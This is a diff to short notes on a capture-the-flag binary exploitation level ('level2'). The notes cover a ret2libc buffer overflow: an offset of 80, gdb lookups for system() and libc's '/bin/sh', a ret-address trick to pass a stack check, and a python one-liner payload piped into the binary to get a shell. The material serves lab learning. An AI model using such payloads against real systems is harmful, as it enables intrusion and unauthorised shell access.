@@ -6,11 +6,12 @@ gdb info function system to get 0xb7e6b060
 https://wiremask.eu/tools/buffer-overflow-pattern-generator/ give you pattern to find offset 80
 
 to avoid protection about 0xb00000 in P
-add the return address of one ret (main or p return ) 
+add the return address of one ret (main or p return )
 
 then the system function then the address of one environnement variable that you set that contain the sh keyword
 
 the adress of libc "/bin/sh" 0xb7f8cc58 -> gdb find &system, +99999, "/bin/sh" 
+we found 0xb7f8cc58
 
-(python -c 'print "A" * 80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "dumm" + "\xa3\xff\xff\xbf"' ; cat ) | ./level2
+(python -c 'print "A" * 80 + "\x4b\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "dumm" + "\x58\xcc\xf8\xb7"'; cat) | ./level2
 
